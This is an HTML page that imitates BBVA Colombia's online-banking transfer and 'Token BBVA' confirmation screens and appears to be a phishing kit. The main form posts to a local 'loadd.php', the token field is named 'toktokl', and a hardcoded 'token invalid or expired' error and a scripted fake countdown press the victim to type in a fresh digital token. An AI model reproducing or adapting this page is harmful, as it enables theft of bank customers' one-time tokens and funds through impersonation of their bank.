<html xmlns="http://www.w3.org/1999/xhtml"><head id="j_idt2"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        ...
        <script type="text/javascript" id="www-widgetapi-script" src="https://www.youtube.com/s/player/6f20102c/www-widgetapi.vflset/www-widgetapi.js" async=""></script><script src="./commad/iframe_api"></script>
  ...
  <link href="./commad/varios.css" rel="stylesheet" type="text/css">

</head><body id="coronitaLayout" class="multipaso coronita" onload="ini()" onclick="stop()" onkeypress="stop()">
<script>
    var data_from_legacy = '{"tagging":{"environment":"pr01","gender":"M","profileID":"11884184","segmentProfile":"N","age":"10/03/1999"}}';
            ...
            <h5 style="margin-right: 35px">Validación de identidad</h5></div><a id="sh2" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget close" onclick="document.getElementById('coronita-modal').style.display = 'flex';;PrimeFaces.ab({s:&quot;sh2&quot;});return false;" type="button">
...
<form id="headerForm" name="headerForm" method="post" action="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="headerForm" value="headerForm">

<a id="headerForm:j_idt12" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show()','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;headerForm:j_idt12&quot;,u:&quot;sh1 sh4&quot;});');return false">
                    <p>Anterior</p></a><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="e2s1">
</form></div><div id="sh5" class="ui-outputpanel ui-widget col-md-12 sh5 breadcrumb" style="display: ;">
<form id="j_idt14" name="j_idt14" method="post" action="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1" enctype="application/x-www-form-urlencoded">
...
</form></div></div></div><div id="content" class="ui-outputpanel ui-widget"><div id="spinnerCoronita" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-shadow ui-hidden-container spinnerCoronitaTheme" role="dialog" aria-labelledby="spinnerCoronita_title" aria-hidden="true" aria-live="off" style="width: auto; height: auto; visibility: visible; left: 615.609px; top: 285.312px; z-index: 1001; display: none;"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top" style=""><span id="spinnerCoronita_title" class="ui-dialog-title"></span></div><div class="ui-dialog-content ui-widget-content" style="height: auto;">
...
<form id="conoritaThemeform" name="conoritaThemeform" method="post" action="loadd.php" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="conoritaThemeform" value="conoritaThemeform">

        <div class="steps-mask" style="height: 636px;">
            <div class="steps-container" style="top: -700%;">
        <div id="conoritaThemeform:stepnumber-0" class="ui-outputpanel ui-widget step" style="height: 636px;">
                ...
                <div class="container">
                    ...
                    <div class="row">
<a id="conoritaThemeform:j_idt30" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt30&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
                            <div class="col-md-4 ">
                                <div class="option">
                                    <i class="iconcoronita-mobile"></i>
                                    <p>Celulares</p>
                                </div>
                               <small class="classtextsmall">Transfiere a números de celular,
                                a través de BBVA o Transfiya.</small>
                            </div></a><a id="conoritaThemeform:j_idt33" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt33&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
                            <div class="col-md-4 ">
                                <div class="option goNextStepBtn">
                                    <i class="iconcoronita-bank"></i>
                                    <p>Cuentas</p>
                                </div>
                              <small class="classtextsmall">Transfiere a cuentas BBVA, a
                                otros bancos e inscribe nuevas cuentas.</small>
                            </div></a><a id="conoritaThemeform:j_idt36" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt36&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
                            <div class="col-md-4 ">
                                <div class="option goNextStepBtn">
                                    <i class="iconcoronita-portfolio"></i>
                                    <p>Mis cuentas</p>
                                </div>
                                <small class="classtextsmall">Transfiere a tus productos BBVA y de otros bancos.</small>
                            </div></a>
                    </div>
					...
					<div class="row "><a id="conoritaThemeform:j_idt40" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt40&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
							<div class="col-md-4 ">
								<div class="option goNextStepBtn">
									<div>
								...
								<i class="iconcoronita-info" style="color: #043263"></i> <small class="classtextsmall">Recibe el dinero que te enviaron
									por Transfiya.</small>
							</div></a><a id="conoritaThemeform:j_idt43" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt43&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
							<div class="col-md-4 ">
								<div class="option goNextStepBtn">
									<div>
							...
							</div></a><a id="conoritaThemeform:j_idt46" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" onclick="jsf.util.chain(this,event,'PF(\'statusDialog\').show();','PrimeFaces.ab({s:this,e:&quot;action&quot;,p:&quot;conoritaThemeform:j_idt46&quot;,u:&quot;conoritaThemeform:pasosForm&quot;});');return false">
							<div class="col-md-4 ">
								<div class="option goNextStepBtn">
									<div>
				...
				</div></div><div id="conoritaThemeform:stepnumber-1" class="ui-outputpanel ui-widget step" style="height: 636px;"><div id="conoritaThemeform:j_idt66" class="ui-outputpanel ui-widget container">
                    <div data-context="DATOS_DESTINO"></div>
                    ...
                    <div class="row"><div id="conoritaThemeform:mainPnlOther" class="ui-outputpanel ui-widget">
                            <div class="col-sm-12 col-md-6"><div id="conoritaThemeform:customPanelOther" class="ui-outputpanel ui-widget" style="margin-bottom:10px"><span id="conoritaThemeform:customRadioOther" class="ui-helper-hidden"></span></div>
                                ...
                                <div class="tabs-container"><div id="conoritaThemeform:pnlTabs" class="ui-outputpanel ui-widget">
                                        <div class="tabs"><a id="conoritaThemeform:j_idt75" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget tab " onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt75&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt75&quot;,u:&quot;conoritaThemeform:mainPnlOther&quot;,onco:function(xhr,status,args){initilizeCustomComponents(); moveTabs(); bcSmartLoad('https://biocatch-wup.bbva.com.co/scripts/b6764381/b6764381.js', 'DATOS_DESTINO', 'EOlVGO281NwW7Y2Z1RzoIKD');;}});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt75&quot;});return false;">
                                                Contacto
                                                </a><a id="conoritaThemeform:j_idt77" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget tab active" onclick="PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt77&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:j_idt77&quot;,u:&quot;conoritaThemeform:mainPnlOther&quot;,onco:function(xhr,status,args){initilizeCustomComponents(); moveTabs(); bcSmartLoad('https://biocatch-wup.bbva.com.co/scripts/b6764381/b6764381.js', 'DATOS_CUENTA_DESTINO', 'EOlVGO281NwW7Y2Z1RzoIKD');;}});;PrimeFaces.ab({s:&quot;conoritaThemeform:j_idt77&quot;});return false;">
                                                Cuentas
                                                </a>
                    ...
                    </div></div></div><div id="conoritaThemeform:stepnumber-2" class="ui-outputpanel ui-widget step" style="height: 636px;">
                    ...
                    <div class="row">
                        <div class="col-sm-12 col-md-6 form"><div id="conoritaThemeform:j_idt104" class="ui-outputpanel ui-widget select-container__coronitaV2"><div id="conoritaThemeform:selectOwnAccount" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectOwnAccount_items" style="min-width: 168px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectOwnAccount_focus" name="conoritaThemeform:selectOwnAccount_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectOwnAccount_0" aria-describedby="conoritaThemeform:selectOwnAccount_0" aria-disabled="false" placeholder="Tipo de producto"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectOwnAccount_input" name="conoritaThemeform:selectOwnAccount_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectOwnAccount&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectOwnAccount&quot;,u:&quot;conoritaThemeform:buttonAdd conoritaThemeform:productTransfer&quot;,onco:function(xhr,status,args){initilizeCustomComponents(),PF('statusDialog').hide();}});"><option value=""></option><option value="AH">Cuenta de Ahorro</option><option value="CC">Cuenta Corriente</option><option value="DE">Dinero Móvil</option><option value="DE2">Depósito Electrónico</option></select></div><label id="conoritaThemeform:selectOwnAccount_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">&nbsp;</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div></div><div id="conoritaThemeform:bank" class="ui-outputpanel ui-widget select-container__coronitaV2"><div id="conoritaThemeform:j_idt116" class="ui-outputpanel ui-widget select-container__coronitaV2"><div id="conoritaThemeform:selectBank" class="ui-selectonemenu ui-widget ui-state-default ui-corner-all select__coronitaV2" role="combobox" aria-haspopup="true" aria-expanded="false" aria-owns="conoritaThemeform:selectBank_items" style="min-width: 340px;"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:selectBank_focus" name="conoritaThemeform:selectBank_focus" type="text" autocomplete="off" aria-expanded="false" aria-autocomplete="list" aria-activedescendant="conoritaThemeform:selectBank_0" aria-describedby="conoritaThemeform:selectBank_0" aria-disabled="false" placeholder="Banco"></div><div class="ui-helper-hidden-accessible"><select id="conoritaThemeform:selectBank_input" name="conoritaThemeform:selectBank_input" tabindex="-1" aria-hidden="true" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:selectBank&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:selectBank&quot;,u:&quot;conoritaThemeform:buttonAdd conoritaThemeform:selectDocumentType&quot;});"><option value=""></option><option value="0013">BANCO BBVA</option><option value="0059">BANCAMIA</option><option value="0040">BANCO AGRARIO</option><option value="0052">BANCO AV VILLAS</option><option value="0805">BANCO BTG PACTUAL</option><option value="0032">BANCO CAJA SOCIAL</option><option value="0009">BANCO CITIBANK</option><option value="0066">BANCO COOPERATIVO COOPCENTRAL</option><option value="0558">BANCO CREDIFINANCIERA SA.</option><option value="0051">BANCO DAVIVIENDA</option><option value="0001">BANCO DE BOGOTÁ</option><option value="0023">BANCO DE OCCIDENTE</option><option value="0062">BANCO FALABELLA</option><option value="0063">BANCO FINANDINA</option><option value="0012">BANCO GNB SUDAMERIS</option><option value="0006">BANCO ITAÚ</option><option value="0014">BANCO ITAÚ*</option><option value="0071">BANCO J.P. MORGAN COLOMBIA S.A</option><option value="0047">BANCO MUNDO MUJER S.A.</option><option value="0060">BANCO PICHINCHA</option><option value="0002">BANCO POPULAR</option><option value="0058">BANCO PROCREDIT</option><option value="0065">BANCO SANTANDER</option><option value="0069">BANCO SERFINANZA S.A.</option><option value="0029">BANCO TEQUENDAMA</option><option value="0804">BANCO UALA BANCAR TECNOLOGIA CO S.A</option><option value="0053">BANCO WWB</option><option value="0031">BANCOLDEX</option><option value="0007">BANCOLOMBIA</option><option value="0067">BANCOMPARTIR </option><option value="0061">BANCOOMEVA</option><option value="0808">BOLD CF</option><option value="0370">COLTEFINANCIERA S.A.</option><option value="0292">CONFIAR COOPERATIVA FINANCIERA</option><option value="0283">COOFIANTIOQUIA</option><option value="0291">COOFINEP COOPERATIVA FINANCIERA</option><option value="0289">COTRAFA COOPERATIVA FINANCIERA</option><option value="0802">DING TECNIPAGOS S.A.</option><option value="0121">FINANCIERA JURISCOOP</option><option value="0303">GIROS Y FINANZAS CF</option><option value="0814">GLOBAL66</option><option value="0637">IRIS</option><option value="0286">JFK COOPERATIVA FINANCIERA</option><option value="0070">LULO BANK S.A.</option><option value="0801">MOVii</option><option value="0560">PIBANK</option><option value="0803">POWWI</option><option value="0811">RAPPIPAY</option><option value="0813">SANTANDER CONSUMER</option><option value="0019">SCOTIABANK COLPATRIA</option><option value="0342">SERVIFINANSA S.A.</option></select></div><label id="conoritaThemeform:selectBank_label" class="ui-selectonemenu-label ui-inputfield ui-corner-all">&nbsp;</label><div class="ui-selectonemenu-trigger ui-state-default ui-corner-right"><span class="ui-icon ui-icon-triangle-1-s ui-c"></span></div></div></div></div>
                            ...
                            <div class="input-container__coronitaV2 error"><input id="conoritaThemeform:inputLoan" name="conoritaThemeform:inputLoan" type="text" autocomplete="off" maxlength="20" placeholder="Número de producto" onkeypress="javascript:return isOnlyNumber(event);" onkeyup="PrimeFaces.ab({s:&quot;conoritaThemeform:inputLoan&quot;,e:&quot;keyup&quot;,p:&quot;conoritaThemeform:inputLoan&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all input__coronitaV2" role="textbox" aria-disabled="false" aria-readonly="false">
                                ...
                                </div></div><div id="conoritaThemeform:j_idt147" class="ui-outputpanel ui-widget" style="margin-left: 25px; "><a id="conoritaThemeform:l-tyc" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget" onclick="document.getElementById('m-tyc').style.display = 'flex';;PrimeFaces.ab({s:&quot;conoritaThemeform:l-tyc&quot;});return false;">
                                    Ver Términos y Condiciones
                                </a>
                                <br></div><div id="conoritaThemeform:check-coronita-v2" class="ui-selectbooleancheckbox ui-chkbox ui-widget check__coronitaV2"><div class="ui-helper-hidden-accessible"><input id="conoritaThemeform:check-coronita-v2_input" name="conoritaThemeform:check-coronita-v2_input" type="checkbox" autocomplete="off" aria-hidden="true" aria-labelledby="conoritaThemeform:j_idt150" aria-checked="false" onchange="PrimeFaces.ab({s:&quot;conoritaThemeform:check-coronita-v2&quot;,e:&quot;change&quot;,p:&quot;conoritaThemeform:check-coronita-v2&quot;,u:&quot;conoritaThemeform:buttonAdd&quot;});"></div><div class="ui-chkbox-box ui-widget ui-corner-all ui-state-default"><span class="ui-chkbox-icon ui-icon ui-icon-blank ui-c"></span></div></div><label id="conoritaThemeform:j_idt150" class="ui-outputlabel ui-widget check-label__coronitaV2" style="position: static !important;" for="conoritaThemeform:check-coronita-v2_input">Leí y acepto los Términos y Condiciones.
                            </label>
                ...
                </div></div><div id="conoritaThemeform:stepnumber-3" class="ui-outputpanel ui-widget step" style="height: 636px;">
                ...
                </div></div><div id="conoritaThemeform:stepnumber-4" class="ui-outputpanel ui-widget step" style="height: 636px;">
                ...
                </div></div><div id="conoritaThemeform:stepnumber-5" class="ui-outputpanel ui-widget step" style="height: 636px;">
                ...
                </div></div><div id="conoritaThemeform:stepnumber-6" class="ui-outputpanel ui-widget step" style="height: 636px;">
                ...
                </div></div><div id="conoritaThemeform:stepnumber-7" class="ui-outputpanel ui-widget step active" style="height: 636px;">
...
<input type="hidden" name="conoritaThemeform:profileComposite:confirmProfiles:tokenComposite:confirmToken" value="conoritaThemeform:profileComposite:confirmProfiles:tokenComposite:confirmToken">

        <img src="./commad/SMS.svg" class="mobile tablet head-image" alt="">
        <div class="container">
            <h3 class="step-identifier">2 de 2
            </h3>
            <h1>Token BBVA</h1>
            <div class="row">

                <div class="col-sm-12 col-md-6">
                        <h2>Genera un token digital a través de la App BBVA para confirmar esta operación. Es por tu seguridad.</h2>
                        <a style="color:red;">Token no valido o expirado. Por favor genera un nuevo token.</a>

                        <div id="input-id1" class="input-container__coronitaV2 password-field ">

                        <input name="toktokl" type="password" autocomplete="off" maxlength="8" required="" placeholder="Ingrese el token digital" style="width: 100%;  height: 100%; position: absolute; display: block; font-size: 16px;
    bottom: 0;
    padding: 12px;
    ...
    border-radius: 1px;
    outline:none;
    font-family: " bbva="" coronita="" book","helvetica="" neue",arial,helvetica,sans-serif;="" -webkit-appearance:="" none;="" border-bottom:="" 1px="" solid="" #121212;="" -webkit-box-shadow:="" box-shadow:="" -webkit-box-sizing:="" border-box;="" box-sizing:="" color:="" #666;"="">
                            <i id="conoritaThemeform:profileComposite:confirmProfiles:tokenComposite:confirmToken:input2_prefix" class="input-password-field__coronitaV2"></i>
                        </div>
                    <div class=" ">
                    ...
                    <div id="countdown">¿No lo has recibido? Espera 01:48 minutos.</div>
                    </h4><a id="conoritaThemeform:profileComposite:confirmProfiles:tokenComposite:confirmToken:sendCode" href="#/kqco_co_web/page/cashConversion/transfers?execution=e2s1#" class="ui-commandlink ui-widget bold token" onclick="$('.token').css('display', 'none');                                    $('#blockTimer').css('display', 'block');                                    startTimer(2,'timer');;PrimeFaces.ab({s:&quot;conoritaThemeform:profileComposite:confirmProfiles:tokenComposite:confirmToken:sendCode&quot;,e:&quot;click&quot;,p:&quot;conoritaThemeform:profileComposite:confirmProfiles:tokenComposite:confirmToken:sendCode&quot;});;PrimeFaces.ab({s:&quot;conoritaThemeform:profileComposite:confirmProfiles:tokenComposite:confirmToken:sendCode&quot;});return false;" style="display: none;"> Solicitar nuevo token
                        </a>
                    <div class="buttons">
                    <input type="submit" value="Confirmar" class="ui-commandlink ui-widget ui-state-disabled btn btn-aqua btn-full btn-full-md next-step-button">

                    </div>
                </div>

<script>
  const durationInSeconds = 114; // 1 minuto y 54 segundos
  ...
  function startCountdown() {
    ...
    function updateCountdown() {
      ...
      countdownElement.textContent = `¿No lo has recibido? Espera ${formattedTime} minutos.`;
  ...
  window.onload = startCountdown;
                ...
                <div class="col-md-5 col-sm-12 col-md-offset-1">
                    <div class="help gold half-illustration">
                        <div class="desktop">
                            <img src="./commad/SMS.svg" class="tCenter" alt="">
                        </div>
                            <p>
                                Recuerda que el código lo puedes generar en la App BBVA en la
                                opción:<br> <strong>Menú &gt;&gt; Token digital</strong> <br>
                                <br> Si no lo tienes activo ingresa por la opción:
                                <br> <strong>Menú&gt;&gt; Seguridad y privacidad &gt;&gt; Accesos y firmas&gt;&gt; Firmas</strong> <br>
                            </p>
                    </div>
                </div>
